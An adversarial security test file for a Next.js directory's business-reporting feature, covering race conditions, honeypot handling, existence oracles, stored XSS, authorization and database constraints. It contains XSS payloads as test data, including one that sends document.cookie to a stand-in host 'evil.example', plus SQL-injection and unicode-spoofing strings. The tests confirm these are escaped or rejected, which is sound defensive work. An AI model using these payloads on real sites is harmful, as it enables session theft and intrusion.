import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("next/headers", async () => {
  const simulado = await import("./admin-mocks");
  return { cookies: simulado.cookies, headers: simulado.headers };
});
vi.mock("next/navigation", async () => {
  const simulado = await import("./admin-mocks");
  return { redirect: simulado.redirect, notFound: simulado.notFound };
});

import { seedCatalogos } from "../prisma/seed";
import DetalleRegistroAdminPage from "../src/app/admin/registros/[id]/page";
import { marcarReporteAtendidoAccion } from "../src/app/admin/registros/[id]/accion-marcar-reporte-atendido";
import FichaNegocioPage from "../src/app/(publico)/negocio/[ficha]/page";
import { reportarNegocio } from "../src/app/(publico)/negocio/[ficha]/reportar/accion";
import ReportarGraciasPage from "../src/app/(publico)/negocio/[ficha]/reportar/gracias/page";
import ReportarNegocioPage from "../src/app/(publico)/negocio/[ficha]/reportar/page";
import type { PrismaClient } from "../src/generated/prisma/client";
import {
  LONGITUD_MINIMA_SECRETO,
  VARIABLE_CONTRASENA,
  VARIABLE_SECRETO_SESION,
  VARIABLE_URL_SITIO,
} from "../src/lib/admin/config";
import { marcarReporteAtendido } from "../src/lib/admin/reportes";
import { NOMBRE_COOKIE_SESION, crearValorDeSesion } from "../src/lib/admin/sesion";
import { construirSegmentoFicha } from "../src/lib/ficha-url";
import {
  NOMBRE_COOKIE_BORRADOR,
  codificarBorrador,
  decodificarBorrador,
} from "../src/lib/reportes/borrador";
import {
  TOPE_REPORTES_PENDIENTES_POR_NEGOCIO,
  reiniciarCupoDeReportes,
} from "../src/lib/reportes/limite";
import { LIMITE_COMENTARIO_REPORTE } from "../src/lib/reportes/textos";
import {
  NoEncontradoSimulado,
  RedireccionSimulada,
  peticion,
  reiniciarPeticion,
} from "./admin-mocks";
import { crearClientePrueba } from "./db";

/**
 * ETAPA C · pruebas adversariales de seguridad del botón "Reportar"
 * (change `agregar-boton-reportar`). NO repiten lo que ya cubre el dev en
 * `reportes-adversarial.test.ts`, `reportes-privacidad.test.ts` ni
 * `admin-reportes-paginas.test.ts`: aquí van los frentes que el camino feliz
 * y el adversarial secuencial no tocan —CARRERAS entre peticiones simultáneas,
 * indistinguibilidad byte a byte de la confirmación falsa, oráculos de
 * existencia, payloads unicode hostiles de 300 caracteres exactos y los CHECK
 * de la migración forzados con INSERT crudo.
 *
 * Los casos marcados con `it.fails` documentan un HALLAZGO abierto: la
 * aserción es la que la spec exige, y hoy NO se cumple. Cuando el dev corrija
 * el defecto el caso pasará a rojo y habrá que quitarle el `.fails`; ese es
 * justo el aviso que se busca. Cada uno cita su hallazgo de
 * `reports/c-seguridad.md`.
 *
 * Iteración 2: A1, A2, M1 y B1 quedaron corregidos y sus casos ya no llevan
 * `.fails`. El único `.fails` que queda es el de M3 (`hrefFicha` es un
 * argumento ligado que el cliente puede cambiar en el POST), verificado
 * también contra `next build && next start`.
 *
 * TODOS los datos son ficticios (repo público + LFPDPPP): números 771999 0xxx,
 * IPs de los rangos reservados para documentación (RFC 5737).
 */

const PREFIJO = "7719990";
const ENCABEZADO_IP = "x-forwarded-for";
const IP = "203.0.113.99"; // TEST-NET-3, reservado para documentación
const SECRETO = "s".repeat(LONGITUD_MINIMA_SECRETO);
const OTRO_SECRETO = "o".repeat(LONGITUD_MINIMA_SECRETO);

const NOMBRE = "Ferretería Ficticia El Tornillo";
const NOMBRE_OTRO = "Lonchería Ficticia La Esquina";
const NOMBRE_REVISION = "Estudio Ficticio Sin Publicar";
const NOMBRE_RECHAZADO = "Bar Ficticio Rechazado";

let prisma: PrismaClient;
let categoriaId: number;
let coloniaId: number;
let idPublicado = "";
let idOtroPublicado = "";
let idEnRevision = "";
let idRechazado = "";
let segmento = "";

async function alta(
  nombre: string,
  whatsapp: string,
  estado: "en_revision" | "publicado" | "rechazado",
): Promise<string> {
  const creado = await prisma.negocio.create({
    data: {
      nombre,
      categoriaId,
      coloniaId,
      whatsapp,
      consintioAvisoEn: new Date("2026-08-01T10:00:00.000Z"),
      estado,
      publicadoEn: estado === "publicado" ? new Date("2026-08-10T10:00:00.000Z") : null,
    },
  });
  return creado.id;
}

/**
 * Manda un envío al servidor: devuelve la URL del redirect o `"404"`. Desde la
 * corrección de M3 el único argumento ligado es el identificador del negocio;
 * la ruta de la ficha la reconstruye el servidor.
 */
async function respuestaDe(formData: FormData, id = idPublicado): Promise<string> {
  try {
    await reportarNegocio(id, formData);
  } catch (error) {
    if (error instanceof RedireccionSimulada) return error.url;
    if (error instanceof NoEncontradoSimulado) return "404";
    throw error;
  }
  throw new Error("se esperaba una redirección o un 404");
}

function envio(campos: Record<string, string> = {}): FormData {
  const formData = new FormData();
  for (const [clave, valor] of Object.entries(campos)) formData.append(clave, valor);
  return formData;
}

async function render(pagina: Promise<React.ReactElement> | React.ReactElement) {
  const resuelta = await pagina;
  return renderToStaticMarkup(createElement(() => resuelta));
}

const CONFIRMACION = () => `/negocio/${segmento}/reportar/gracias`;

function conSesion(secreto = SECRETO) {
  peticion.cookies[NOMBRE_COOKIE_SESION] = crearValorDeSesion(secreto);
}

beforeAll(async () => {
  process.env[VARIABLE_CONTRASENA] = "contrasena-de-prueba-nada-real";
  process.env[VARIABLE_SECRETO_SESION] = SECRETO;
  process.env[VARIABLE_URL_SITIO] = "https://necesitouno.example";

  prisma = crearClientePrueba();
  await seedCatalogos(prisma);
  categoriaId = (
    await prisma.categoria.findUniqueOrThrow({ where: { slug: "talleres" } })
  ).id;
  coloniaId = (
    await prisma.colonia.findUniqueOrThrow({ where: { slug: "haciendas-de-tizayuca" } })
  ).id;
  await prisma.negocio.deleteMany({ where: { whatsapp: { startsWith: PREFIJO } } });

  idPublicado = await alta(NOMBRE, `${PREFIJO}01`, "publicado");
  idOtroPublicado = await alta(NOMBRE_OTRO, `${PREFIJO}02`, "publicado");
  idEnRevision = await alta(NOMBRE_REVISION, `${PREFIJO}03`, "en_revision");
  idRechazado = await alta(NOMBRE_RECHAZADO, `${PREFIJO}04`, "rechazado");
  segmento = construirSegmentoFicha(NOMBRE, idPublicado);
});

afterAll(async () => {
  delete process.env.REGISTRO_ENCABEZADO_IP;
  await prisma.negocio.deleteMany({ where: { whatsapp: { startsWith: PREFIJO } } });
  await prisma.$disconnect();
});

beforeEach(async () => {
  reiniciarPeticion();
  reiniciarCupoDeReportes();
  delete process.env.REGISTRO_ENCABEZADO_IP;
  await prisma.reporte.deleteMany();
});

// ── 1. Carreras: las tres defensas bajo peticiones simultáneas ──────────────
//
// Node atiende varias peticiones a la vez y `crearReporte` hace
// comprobar-luego-actuar con un `await` de por medio (`count` → `create`,
// `bloqueada` → `registrar`). Un atacante no necesita nada exótico: abrir
// varias conexiones en paralelo es lo que hace cualquier cliente HTTP/2.

describe("adversarial · carreras contra el cupo y el tope", () => {
  // HALLAZGO A1 (alto), CORREGIDO en la iteración 2 del dev: el tope viaja
  // dentro del `INSERT` (una sola sentencia condicionada al conteo de
  // pendientes), así que ya no hay ventana entre comprobar y escribir.
  // Spec `directorio-publico`, requirement "Anti-abuso…": "cuando un negocio
  // ya acumula 10 reportes sin atender, los envíos siguientes sobre esa misma
  // ficha NO DEBEN guardarse".
  it("[A1] el tope de 10 pendientes aguanta 14 envíos SIMULTÁNEOS sobre la misma ficha", async () => {
    await Promise.all(
      Array.from({ length: 14 }, () => respuestaDe(envio({ motivo: "cerrado" }))),
    );
    expect(await prisma.reporte.count({ where: { negocioId: idPublicado } })).toBeLessThanOrEqual(
      TOPE_REPORTES_PENDIENTES_POR_NEGOCIO,
    );
  });

  // La otra mitad del hallazgo: no basta con que no se pase del tope, hay que
  // llegar EXACTAMENTE a él (ni uno de menos: los 10 primeros son reportes
  // legítimos que no se pueden perder por la carrera) y los cuatro sobrantes
  // tienen que ver la confirmación de siempre, sin enterarse del tope.
  it("[A1] de 14 simultáneos entran 10 y los 4 sobrantes ven la confirmación normal", async () => {
    const destinos = await Promise.all(
      Array.from({ length: 14 }, () => respuestaDe(envio({ motivo: "cerrado" }))),
    );

    expect(await prisma.reporte.count({ where: { negocioId: idPublicado } })).toBe(
      TOPE_REPORTES_PENDIENTES_POR_NEGOCIO,
    );
    expect(destinos.every((destino) => destino === CONFIRMACION())).toBe(true);
  });

  // HALLAZGO A2 (alto), CORREGIDO: el cupo se comprueba y se aparta en un solo
  // paso síncrono (`apartarCupoDeReportes`), sin ceder el turno a la mitad.
  // Mismo requirement: "desde la misma IP llega un cuarto reporte dentro de la
  // misma hora → no se guarda nada".
  it("[A2] el cupo de 3/hora aguanta 8 envíos SIMULTÁNEOS desde la misma IP", async () => {
    process.env.REGISTRO_ENCABEZADO_IP = ENCABEZADO_IP;
    peticion.encabezados[ENCABEZADO_IP] = IP;

    await Promise.all(
      Array.from({ length: 8 }, () => respuestaDe(envio({ motivo: "cerrado" }))),
    );
    expect(await prisma.reporte.count()).toBeLessThanOrEqual(3);
  });

  it("[A2] de 8 simultáneos desde una IP entran 3 y los otros 5 ven el error de cupo", async () => {
    process.env.REGISTRO_ENCABEZADO_IP = ENCABEZADO_IP;
    peticion.encabezados[ENCABEZADO_IP] = IP;

    const destinos = await Promise.all(
      Array.from({ length: 8 }, () => respuestaDe(envio({ motivo: "cerrado" }))),
    );
    expect(destinos.filter((destino) => destino.includes("error=cupo"))).toHaveLength(5);
    expect(await prisma.reporte.count()).toBe(3);
  });

  // Lo que SÍ es atómico y hay que dejar fijado para que no se rompa: la
  // transición del panel usa `updateMany` condicionado al estado.
  it("dos 'Marcar como atendido' simultáneos solo atienden una vez y no pisan la fecha", async () => {
    const reporte = await prisma.reporte.create({
      data: { negocioId: idPublicado, motivo: "cerrado" },
    });
    const primera = new Date("2026-09-01T10:00:00.000Z");
    const segunda = new Date("2026-09-02T10:00:00.000Z");

    const resultados = await Promise.all([
      marcarReporteAtendido(prisma, reporte.id, primera),
      marcarReporteAtendido(prisma, reporte.id, segunda),
    ]);

    expect(resultados.filter((r) => r === "atendido")).toHaveLength(1);
    expect(resultados.filter((r) => r === "ya-atendido")).toHaveLength(1);
    const releido = await prisma.reporte.findUniqueOrThrow({ where: { id: reporte.id } });
    expect(releido.atendidoEn?.toISOString()).toBe(primera.toISOString());
  });
});

// ── 2. La confirmación falsa: indistinguible byte a byte ────────────────────

describe("adversarial · la confirmación falsa no se distingue de la buena", () => {
  const graciasHtml = () =>
    render(ReportarGraciasPage({ params: Promise.resolve({ ficha: segmento }) } as never));

  it("guardado, honeypot y tope terminan en la MISMA URL y el MISMO HTML", async () => {
    const bueno = await respuestaDe(envio({ motivo: "cerrado" }));
    const htmlBueno = await graciasHtml();
    await prisma.reporte.deleteMany();
    reiniciarCupoDeReportes();

    const conTrampa = await respuestaDe(
      envio({ motivo: "cerrado", sitio_web: "http://spam.example" }),
    );
    const htmlTrampa = await graciasHtml();
    expect(await prisma.reporte.count()).toBe(0);

    await prisma.reporte.createMany({
      data: Array.from({ length: TOPE_REPORTES_PENDIENTES_POR_NEGOCIO }, () => ({
        negocioId: idPublicado,
        motivo: "cerrado",
      })),
    });
    const conTope = await respuestaDe(envio({ motivo: "cerrado" }));
    const htmlTope = await graciasHtml();

    expect(conTrampa).toBe(bueno);
    expect(conTope).toBe(bueno);
    // Byte a byte: no hay un carácter de diferencia entre las tres pantallas.
    expect(htmlTrampa).toBe(htmlBueno);
    expect(htmlTope).toBe(htmlBueno);
    expect(htmlBueno).not.toMatch(/reporte|pendiente|tope|trampa|honeypot/i);
  });

  it.each([
    ["un motivo inventado", { motivo: "porque-si" }],
    ["sin motivo", {}],
    ["un comentario de 400 caracteres", { motivo: "cerrado", comentario: "z".repeat(400) }],
    ["el motivo repetido", { motivo: "cerrado" }],
  ])(
    "la trampa gana sobre %s: el orden de las defensas tampoco la delata",
    async (_caso, campos) => {
      const destino = await respuestaDe(envio({ ...campos, sitio_web: "bot" }));
      expect(destino).toBe(CONFIRMACION());
      expect(destino).not.toContain("error=");
      expect(await prisma.reporte.count()).toBe(0);
    },
  );

  it("con el cupo agotado la trampa sigue ganando: nunca se ve el error de cupo", async () => {
    process.env.REGISTRO_ENCABEZADO_IP = ENCABEZADO_IP;
    peticion.encabezados[ENCABEZADO_IP] = IP;
    for (let i = 0; i < 3; i++) await respuestaDe(envio({ motivo: "cerrado" }));
    expect(await respuestaDe(envio({ motivo: "cerrado" }))).toContain("error=cupo");

    expect(await respuestaDe(envio({ motivo: "cerrado", sitio_web: "bot" }))).toBe(
      CONFIRMACION(),
    );
    expect(await prisma.reporte.count()).toBe(3);
  });

  // HALLAZGO M1 (medio), CORREGIDO: el honeypot del reporte compara sin
  // espacios, igual que el de altas (`texto()` de
  // `src/lib/registro/validacion.ts` recorta antes de mirar). Un espacio de un
  // autocompletado ya no tira el aviso de una persona real —que además veía la
  // confirmación de éxito y nunca se enteraba—. Spec: "el campo trampa
  // permanece vacío y su reporte se procesa normalmente".
  it("[M1] un espacio en el campo trampa no tira el reporte", async () => {
    await respuestaDe(envio({ motivo: "cerrado", sitio_web: " " }));
    expect(await prisma.reporte.count()).toBe(1);
  });

  it.each([
    ["varios espacios", "   "],
    ["tabulador y salto de línea", "\t\n "],
  ])("[M1] el campo trampa con %s sigue contando como vacío", async (_caso, trampa) => {
    expect(await respuestaDe(envio({ motivo: "cerrado", sitio_web: trampa }))).toBe(
      CONFIRMACION(),
    );
    expect(await prisma.reporte.count()).toBe(1);
  });

  it("[M1] la trampa con contenido de verdad (lo que escribe un bot) sí descarta", async () => {
    expect(
      await respuestaDe(envio({ motivo: "cerrado", sitio_web: " http://spam.example " })),
    ).toBe(CONFIRMACION());
    expect(await prisma.reporte.count()).toBe(0);
  });

  // Scenario "el honeypot no molesta a las personas" — el dev lo dejó como
  // verificación MANUAL en su mapa; aquí queda automatizado.
  it("un envío sin el campo trampa (el de una persona) se procesa normalmente", async () => {
    expect(await respuestaDe(envio({ motivo: "cerrado" }))).toBe(CONFIRMACION());
    expect(await prisma.reporte.count()).toBe(1);
  });

  it("el formulario esconde el campo trampa de teclado y lector de pantalla", async () => {
    const html = await render(
      ReportarNegocioPage({
        params: Promise.resolve({ ficha: segmento }),
        searchParams: Promise.resolve({}),
      } as never),
    );
    expect(html).toContain('aria-hidden="true"');
    expect(html).toContain('name="sitio_web"');
    expect(html).toContain('tabindex="-1"');
  });
});

// ── 3. Oráculos: qué se puede averiguar preguntando ─────────────────────────

describe("adversarial · la página de reporte no es un oráculo de existencia", () => {
  const abrir = (ficha: string) =>
    render(
      ReportarNegocioPage({
        params: Promise.resolve({ ficha }),
        searchParams: Promise.resolve({}),
      } as never),
    );

  it.each([
    ["en revisión", () => construirSegmentoFicha(NOMBRE_REVISION, idEnRevision)],
    ["rechazado", () => construirSegmentoFicha(NOMBRE_RECHAZADO, idRechazado)],
    ["un id con forma de cuid que no existe", () => "algo-cmtaaaaaaaaaaaaaaaaaaaaaa"],
    ["un segmento sin id", () => "solo-un-nombre"],
    ["un segmento vacío", () => ""],
    ["un segmento con marcado", () => '"><svg onload=alert(1)>'],
  ])("abrir la página de %s da el mismo 404, sin datos del negocio", async (_caso, ficha) => {
    await expect(abrir(ficha())).rejects.toBeInstanceOf(NoEncontradoSimulado);
  });

  it("el 404 del formulario y el del envío son el mismo notFound(), sin argumentos", async () => {
    const capturado: unknown[][] = [];
    const espia = vi
      .spyOn(await import("./admin-mocks"), "notFound")
      .mockImplementation(((...args: unknown[]) => {
        capturado.push(args);
        throw new NoEncontradoSimulado();
      }) as never);

    await expect(
      abrir(construirSegmentoFicha(NOMBRE_REVISION, idEnRevision)),
    ).rejects.toBeInstanceOf(NoEncontradoSimulado);
    espia.mockRestore();
    // Ni el nombre, ni el WhatsApp, ni el estado viajan en la respuesta 404.
    expect(JSON.stringify(capturado)).not.toContain(NOMBRE_REVISION);
  });

  // La 404 no consume cupo: sondear fichas no publicadas es gratis (queda
  // anotado como observación O3), pero a cambio el cupo tampoco delata cuáles
  // existen. Esta prueba fija esa mitad: el sondeo no le quita cupo a nadie.
  it("sondear fichas no publicadas no gasta el cupo del que sí reporta", async () => {
    process.env.REGISTRO_ENCABEZADO_IP = ENCABEZADO_IP;
    peticion.encabezados[ENCABEZADO_IP] = IP;

    for (const id of [idEnRevision, idRechazado, "no-existe-jamas", idEnRevision, idRechazado]) {
      expect(await respuestaDe(envio({ motivo: "cerrado" }), id)).toBe("404");
    }
    expect(await respuestaDe(envio({ motivo: "cerrado" }))).toBe(CONFIRMACION());
    expect(await prisma.reporte.count()).toBe(1);
  });

  it("la confirmación no consulta la base: la de una ficha inventada es idéntica", async () => {
    const real = await render(
      ReportarGraciasPage({ params: Promise.resolve({ ficha: segmento }) } as never),
    );
    const inventada = await render(
      ReportarGraciasPage({
        params: Promise.resolve({ ficha: "negocio-que-no-existe-cmtzzz" }),
      } as never),
    );
    expect(real.replace(segmento, "X")).toBe(
      inventada.replace("negocio-que-no-existe-cmtzzz", "X"),
    );
  });

  it("un segmento hostil en la confirmación se escapa y no sale del sitio", async () => {
    const html = await render(
      ReportarGraciasPage({
        params: Promise.resolve({ ficha: '"><img src=x onerror=alert(1)>' }),
      } as never),
    );
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&quot;&gt;&lt;img");
    // El único enlace sigue siendo interno: nada de esquema ni de "//".
    const hrefs = [...html.matchAll(/href="([^"]*)"/g)].map((m) => m[1]);
    for (const href of hrefs) {
      expect(href.startsWith("/negocio/")).toBe(true);
      expect(href).not.toMatch(/^\/\//);
    }
  });
});

// ── 4. XSS almacenado hacia el panel (el único lector del comentario) ───────

describe("adversarial · el comentario nunca se interpreta como marcado en el panel", () => {
  /** Deja un reporte con ese comentario y devuelve el HTML del detalle. */
  async function panelCon(comentario: string): Promise<string> {
    await prisma.reporte.create({
      data: { negocioId: idPublicado, motivo: "cerrado", comentario },
    });
    conSesion();
    return render(
      DetalleRegistroAdminPage({
        params: Promise.resolve({ id: idPublicado }),
        searchParams: Promise.resolve({}),
      } as never),
    );
  }

  /** Payload de EXACTAMENTE 300 caracteres (la cota), relleno hasta el tope. */
  function de300(inicio: string): string {
    const relleno = "a".repeat(Math.max(0, LIMITE_COMENTARIO_REPORTE - inicio.length));
    const texto = (inicio + relleno).slice(0, LIMITE_COMENTARIO_REPORTE);
    expect(texto).toHaveLength(LIMITE_COMENTARIO_REPORTE);
    return texto;
  }

  /**
   * El HTML de la sección de reportes —y SOLO de ella—, sin el `<script>` de
   * reposición de formularios que React añade siempre al final (no es
   * contenido del panel y ensucia cualquier búsqueda de `<script`).
   *
   * El corte termina en el `</section>` de la propia sección, no al final del
   * documento: al fusionar T-015 el detalle pasó a pintar DESPUÉS los controles
   * de despublicar y de borrar, y "Borrar definitivamente" es un `<a>`
   * legítimo del panel. Sin acotar, estas aserciones —que existen para vigilar
   * lo que el comentario de un vecino puede meter en el HTML— acabarían
   * juzgando marcado que no tiene nada que ver con el reporte.
   */
  function seccionDeReportes(html: string): string {
    const sinReactForms = html.replace(/<script>[\s\S]*?<\/script>/g, "");
    const desde = sinReactForms.indexOf("Reportes sin atender");
    expect(desde).toBeGreaterThan(-1);
    const hasta = sinReactForms.indexOf("</section>", desde);
    expect(hasta, "la sección de reportes no cierra").toBeGreaterThan(desde);
    return sinReactForms.slice(desde, hasta);
  }

  it.each([
    ["cierre de etiqueta + script", "</p><script>alert(document.cookie)</script>"],
    [
      "atributo con manejador",
      '"><img src=x onerror="fetch(`//evil.example?c=${document.cookie}`)">',
    ],
    ["esquema javascript", '<a href="javascript:alert(1)">da clic</a>'],
    ["comentario de HTML sin cerrar", "<!-- <svg/onload=alert(1)>"],
    ["entidad ya escapada", "&lt;script&gt;alert(1)&lt;/script&gt;"],
    ["salto de plantilla", "${process.env.PANEL_SESION_SECRETO}"],
  ])(
    "un comentario de 300 caracteres exactos con %s se pinta como texto",
    async (_caso, inicio) => {
      const payload = de300(inicio);
      const seccion = seccionDeReportes(await panelCon(payload));

      // Dentro de la sección de reportes no nace ninguna etiqueta ni ningún
      // atributo nuevo: ni uno solo de los metacaracteres del payload llega
      // crudo al HTML.
      if (/[<>"'&]/.test(payload)) expect(seccion).not.toContain(payload);
      expect(seccion).not.toContain("<script");
      expect(seccion).not.toContain("<img");
      expect(seccion).not.toContain("<svg");
      expect(seccion).not.toContain("<!--");
      expect(seccion).not.toContain("<a ");
      expect(seccion).not.toContain('href="javascript:');
      // Las etiquetas del payload salen como entidades, es decir, como texto.
      if (payload.includes("<")) expect(seccion).toContain("&lt;");
      // Y en la base se guardó tal cual (design.md §5: no se sanea al escribir).
      const fila = await prisma.reporte.findFirstOrThrow({ where: { negocioId: idPublicado } });
      expect(fila.comentario).toBe(payload);
    },
  );

  it("bidi, zero-width y homoglifos se conservan en la base y quedan dentro del parrafo", async () => {
    // U+202E (RLO) + U+2066 (LRI) + U+200B (ZWSP) + "Reporte atendido." escrito
    // con cirilicas homografas, para intentar suplantar el aviso del panel.
    const payload =
      "\u202Egnp.eslaf\u2066\u200BRep\u043Frt\u0435 \u0430tendid\u043E.\u202C\u200Bcerro hace mucho";
    const seccion = seccionDeReportes(await panelCon(payload));

    const fila = await prisma.reporte.findFirstOrThrow({ where: { negocioId: idPublicado } });
    expect(fila.comentario).toBe(payload); // caracter a caracter, sin saneo

    // El texto vive dentro del `<p>` del comentario y no puede confundirse con
    // el aviso `role="status"`, que solo pinta el servidor tras atender.
    expect(seccion).toContain(`<p class="break-words text-tinta-suave">${payload}</p>`);
    expect(seccion).not.toContain('role="status"');
    // Los homoglifos NO son el literal del panel: siguen siendo otro texto.
    expect(seccion).not.toContain(">Reporte atendido.<");
  });

  it("un comentario con un byte nulo y marcado se pinta escapado, dentro del parrafo", async () => {
    const payload = "cerro\u0000<script>alert(1)</script>\u0000ya";
    const seccion = seccionDeReportes(await panelCon(payload));
    expect(seccion).not.toContain("<script");
    expect(seccion).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    const fila = await prisma.reporte.findFirstOrThrow({ where: { negocioId: idPublicado } });
    expect(fila.comentario).toBe(payload);
  });

  it("un comentario que imita otro motivo no cambia la etiqueta del reporte", async () => {
    const html = await panelCon("Contenido ofensivo o inapropiado");
    // El motivo guardado es `cerrado`: su etiqueta manda, el comentario no.
    expect(html).toContain("Ya cerró");
  });

  it("la cota de 300 se hace valer con caracteres fuera del plano básico", async () => {
    // 150 emojis = 300 unidades UTF-16, la misma cuenta que hace `maxLength`
    // del textarea: cliente y servidor coinciden.
    expect(await respuestaDe(envio({ motivo: "cerrado", comentario: "🌮".repeat(150) }))).toBe(
      CONFIRMACION(),
    );
    reiniciarCupoDeReportes();
    expect(
      await respuestaDe(envio({ motivo: "cerrado", comentario: "🌮".repeat(151) })),
    ).toContain("error=comentario");
    expect(await prisma.reporte.count()).toBe(1);
  });
});

// ── 5. `marcarReporteAtendido`: autorización y entradas hostiles ────────────

describe("adversarial · atender reportes solo desde el panel y sin sorpresas", () => {
  async function unPendiente(negocioId = idPublicado): Promise<string> {
    const creado = await prisma.reporte.create({
      data: { negocioId, motivo: "cerrado", comentario: "Ya no abre." },
    });
    return creado.id;
  }

  it("una cookie firmada con OTRO secreto no atiende nada", async () => {
    const reporteId = await unPendiente();
    conSesion(OTRO_SECRETO);

    let redireccion = "";
    try {
      await marcarReporteAtendidoAccion(idPublicado, reporteId, new FormData());
    } catch (error) {
      if (error instanceof RedireccionSimulada) redireccion = error.url;
      else throw error;
    }

    expect(redireccion).not.toContain("reporte=atendido");
    expect(redireccion).not.toContain(reporteId);
    expect(
      (await prisma.reporte.findUniqueOrThrow({ where: { id: reporteId } })).estado,
    ).toBe("pendiente");
  });

  it.each([
    ["inyección SQL", "' OR 1=1 --"],
    ["comodín LIKE", "%"],
    ["guion bajo de LIKE", "_"],
    ["identificador vacío", ""],
    ["diez mil caracteres", "x".repeat(10_000)],
    ["byte nulo", "\u0000"],
    ["unicode bidi", "‮reporte‬"],
  ])("un id de reporte %s no escribe nada y responde 'ya-atendido'", async (_caso, id) => {
    const reporteId = await unPendiente();

    expect(await marcarReporteAtendido(prisma, id)).toBe("ya-atendido");
    expect(
      (await prisma.reporte.findUniqueOrThrow({ where: { id: reporteId } })).estado,
    ).toBe("pendiente");
    expect(await prisma.reporte.count({ where: { estado: "atendido" } })).toBe(0);
  });

  // HALLAZGO B1 (medio), CORREGIDO: la escritura va condicionada también al
  // `negocioId` del detalle desde el que se manda la acción.
  it("[B1] atender no alcanza a un reporte de OTRO negocio", async () => {
    const ajeno = await unPendiente(idOtroPublicado);
    conSesion();

    try {
      await marcarReporteAtendidoAccion(idPublicado, ajeno, new FormData());
    } catch (error) {
      if (!(error instanceof RedireccionSimulada)) throw error;
    }
    expect((await prisma.reporte.findUniqueOrThrow({ where: { id: ajeno } })).estado).toBe(
      "pendiente",
    );
  });

  it("[B1] el reporte ajeno se responde como 'ya atendido', sin delatar que existe", async () => {
    const ajeno = await unPendiente(idOtroPublicado);
    const propio = await unPendiente();
    conSesion();

    let redireccion = "";
    try {
      await marcarReporteAtendidoAccion(idPublicado, ajeno, new FormData());
    } catch (error) {
      if (error instanceof RedireccionSimulada) redireccion = error.url;
      else throw error;
    }
    // La misma respuesta que un identificador inventado: no se distingue "es
    // de otro negocio" de "no existe".
    expect(redireccion).toBe(`/admin/registros/${idPublicado}?reporte=ya-atendido`);
    expect(redireccion).not.toContain(ajeno);
    expect((await prisma.reporte.findUniqueOrThrow({ where: { id: ajeno } })).estado).toBe(
      "pendiente",
    );
    // Y el reporte que SÍ es de este negocio se sigue pudiendo atender.
    expect(await marcarReporteAtendido(prisma, propio, undefined, idPublicado)).toBe(
      "atendido",
    );
  });

  it("el formulario público no puede producir un reporte atendido por ningún camino", async () => {
    const intentos: Record<string, string>[] = [
      { motivo: "cerrado", estado: "atendido" },
      { motivo: "cerrado", atendidoEn: new Date().toISOString() },
      { motivo: "cerrado", reporteId: "cualquiera", accion: "atender" },
    ];
    for (const campos of intentos) {
      reiniciarCupoDeReportes();
      await respuestaDe(envio(campos));
    }
    expect(await prisma.reporte.count({ where: { estado: "atendido" } })).toBe(0);
    expect(
      await prisma.reporte.count({ where: { atendidoEn: { not: null } } }),
    ).toBe(0);
  });
});

// ── 6. La migración: los CHECK forzados con INSERT crudo ────────────────────
//
// El dev prueba los CHECK a través de Prisma. Aquí se van por debajo, con SQL
// crudo, que es como llegaría un script de operación o un `sqlite3` a mano.

describe("adversarial · los CHECK de la migración aguantan un INSERT crudo", () => {
  async function insertar(motivo: string, estado: string): Promise<"ok" | "rechazado"> {
    try {
      await prisma.$executeRawUnsafe(
        `INSERT INTO "Reporte" ("id","negocioId","motivo","estado","creadoEn") VALUES (?,?,?,?,?)`,
        `crudo-${Math.random().toString(36).slice(2)}`,
        idPublicado,
        motivo,
        estado,
        Date.now(),
      );
      return "ok";
    } catch {
      return "rechazado";
    }
  }

  it.each([
    ["otra caja", "Cerrado"],
    ["con espacio al final", "cerrado "],
    ["vacío", ""],
    ["dos motivos juntos", "cerrado,no_real"],
    ["con inyección", "cerrado' OR '1'='1"],
    ["con byte nulo", "cerrado\u0000"],
    ["del vocabulario del estado", "pendiente"],
    ["del vocabulario del negocio", "publicado"],
  ])("la base rechaza el motivo %s", async (_caso, motivo) => {
    expect(await insertar(motivo, "pendiente")).toBe("rechazado");
    expect(await prisma.reporte.count()).toBe(0);
  });

  it.each([
    ["otra caja", "PENDIENTE"],
    ["vacío", ""],
    ["inventado", "borrado"],
    ["del vocabulario del negocio", "publicado"],
    ["con espacio", "atendido "],
  ])("la base rechaza el estado %s", async (_caso, estado) => {
    expect(await insertar("cerrado", estado)).toBe("rechazado");
    expect(await prisma.reporte.count()).toBe(0);
  });

  it("los cuatro motivos y los dos estados válidos sí entran", async () => {
    for (const motivo of ["cerrado", "no_real", "datos_incorrectos", "inapropiado"]) {
      expect(await insertar(motivo, "pendiente")).toBe("ok");
    }
    expect(await insertar("cerrado", "atendido")).toBe("ok");
    expect(await prisma.reporte.count()).toBe(5);
  });

  it("la base rechaza un reporte huérfano (negocio inexistente)", async () => {
    await expect(
      prisma.$executeRawUnsafe(
        `INSERT INTO "Reporte" ("id","negocioId","motivo","estado","creadoEn") VALUES (?,?,?,?,?)`,
        "crudo-huerfano",
        "negocio-que-no-existe",
        "cerrado",
        "pendiente",
        Date.now(),
      ),
    ).rejects.toThrow();
    expect(await prisma.reporte.count()).toBe(0);
  });
});

// ── 7. Cero rastro de reportes en el directorio público ─────────────────────

describe("adversarial · el directorio público no sabe nada de los reportes", () => {
  const CANARIO = "CANARIO-FUGA-9F3A-NUNCA-PUBLICO";

  it("ni el comentario, ni el id, ni el valor crudo del motivo salen en la ficha", async () => {
    const creados = await Promise.all(
      (["cerrado", "no_real", "datos_incorrectos", "inapropiado"] as const).map((motivo) =>
        prisma.reporte.create({
          data: { negocioId: idPublicado, motivo, comentario: `${CANARIO} ${motivo}` },
        }),
      ),
    );

    const html = await render(
      FichaNegocioPage({
        params: Promise.resolve({ ficha: segmento }),
        searchParams: Promise.resolve({}),
      } as never),
    );

    expect(html).not.toContain(CANARIO);
    for (const reporte of creados) expect(html).not.toContain(reporte.id);
    for (const motivo of ["no_real", "datos_incorrectos", "inapropiado"]) {
      expect(html).not.toContain(motivo);
    }
    for (const etiqueta of ["Ya cerró", "No es real", "Los datos están mal"]) {
      expect(html).not.toContain(etiqueta);
    }
    // Ni conteos: nada que se parezca a "4 reportes".
    expect(html).not.toMatch(/\d+\s+reportes?/i);
  });

  it("la propia página del formulario tampoco cuenta cuántos reportes lleva la ficha", async () => {
    await prisma.reporte.createMany({
      data: Array.from({ length: TOPE_REPORTES_PENDIENTES_POR_NEGOCIO }, () => ({
        negocioId: idPublicado,
        motivo: "cerrado",
        comentario: CANARIO,
      })),
    });

    const html = await render(
